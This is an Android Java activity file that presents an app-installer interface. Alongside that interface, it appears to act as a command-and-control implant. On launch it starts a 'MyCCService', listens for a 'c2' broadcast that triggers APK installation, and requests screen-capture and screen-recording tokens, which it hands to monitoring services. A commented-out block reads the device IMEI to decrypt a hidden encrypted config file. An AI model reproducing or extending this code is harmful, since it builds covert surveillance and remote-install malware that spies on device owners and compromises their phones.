package com.example.TestPlugin;

import android.Manifest;
import android.annotation.TargetApi;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentStatePagerAdapter;
import android.support.v4.content.ContextCompat;
import android.support.v4.view.ViewPager;
import android.support.v7.app.AppCompatActivity;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.example.SystemServices.MonitorService;
import com.example.SystemServices.MyCCService;
import com.example.SystemServices.intentInterface;

public class MyActivity extends AppCompatActivity {
    public Context ctx;
    String ACTION_c2_INSTALL_APK = "com.example.action.ACTION_INSTALL_APK";
    public ABroadcastReceiver mABroadcastReceiver = new ABroadcastReceiver();
    public class ABroadcastReceiver extends BroadcastReceiver {

        void registerReceiver(Context con) {
            IntentFilter f = new IntentFilter();
            f.addAction(ACTION_c2_INSTALL_APK);
            con.registerReceiver(this, f);
        }

        void unregisterReceiver(Context con) {
            con.unregisterReceiver(this);
        }

        @Override
        public void onReceive(Context context, Intent intent) {
            android.util.Log.d("tluo", "ABroadcastReceiver Rely to C2IntentService: " + intent.getAction());
            if (ACTION_c2_INSTALL_APK.equals(intent.getAction())) {
                ComponentName comp = new ComponentName(context.getPackageName(), MyCCService.class.getName());
                intent.setComponent(comp);
                context.startService(intent);
            } else {
            }
        }
    }

    private static final String TAG = "MyActivity";


    private ViewPager mViewPager;
    private FragmentStatePagerAdapter mFragmentStatePagerAdapter = new FragmentStatePagerAdapter(getSupportFragmentManager()) {

        @Override
        public int getCount() {
            return 2;
        }

        @Override
        public Fragment getItem(int position) {
            if (position == 0) {
                return new InstalledFragment();
            } else {
                return new ApkFragment();
            }
        }

        @Override
        public CharSequence getPageTitle(int position) {
            if (position == 0) {
                return "已安装";
            } else {
                return "待安装";
            }
        }
    };

    private static final int REQUEST_MEDIA_PROJECTION = 18;
    private static final int REQUEST_MEDIA_RECORD = 201;
    @TargetApi(21)
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        mViewPager = (ViewPager) findViewById(R.id.pager);
        mViewPager.setAdapter(mFragmentStatePagerAdapter);
        mABroadcastReceiver.registerReceiver(getApplication());

        startService(new Intent(this, MyCCService.class));

        MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        startActivityForResult(projectionManager.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION);
        startActivityForResult(projectionManager.createScreenCaptureIntent(), REQUEST_MEDIA_RECORD);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        switch (requestCode) {
            case REQUEST_MEDIA_PROJECTION:
                if (resultCode == RESULT_OK && data != null) {
                    MonitorService.setScreenshotIntentToken(data);
                    Log.d("MyActivity-Host", "[tluo] Main Activity -- request Screenshot Permission -- Granted:" + data.toString());
                }
                break;
            case REQUEST_MEDIA_RECORD:
                if (resultCode == RESULT_OK && data != null) {
                    Intent intent = new Intent(this, MyCCService.class);
                    intent.setAction(intentInterface.ACTION_setScreenRecordingIntent);
                    intent.putExtra(intentInterface.Param_ScreenRecording_token, data);
                    startService(intent);
                    Log.d("MyActivity-Host", "[tluo] Main Activity -- request ScreenRecording Permission -- Granted:" + data.toString());
                }
                break;
        }
    }

    private boolean check_device() {
        /*
        TelephonyManager telephonyManager = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
        if ( ContextCompat.checkSelfPermission( this, Manifest.permission.READ_PHONE_STATE ) != PackageManager.PERMISSION_GRANTED) {
            Log.d(tag, "[tluo] Main Activity -- READ_PHONE_STATE not granted: ");
            return false;
        }

        String imei = null;
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            imei = telephonyManager.getDeviceId();
        } else {
            imei = telephonyManager.getImei();
        }
        Log.d(tag, "[tluo] Main Activity -- IMEI: " + imei);
        if (imei != null) {
            String filename = "config.enc";
            Crypt in = Crypt.getInstance(imei);
            String content = in.decrypt_file(this.getExternalCacheDir().toString(), filename);
            Log.d(tag, "[tluo] Main Activity -- decrypted content: " + content);
            //TODO: check the content of this secret
        }
        */
        return false;
    }

}
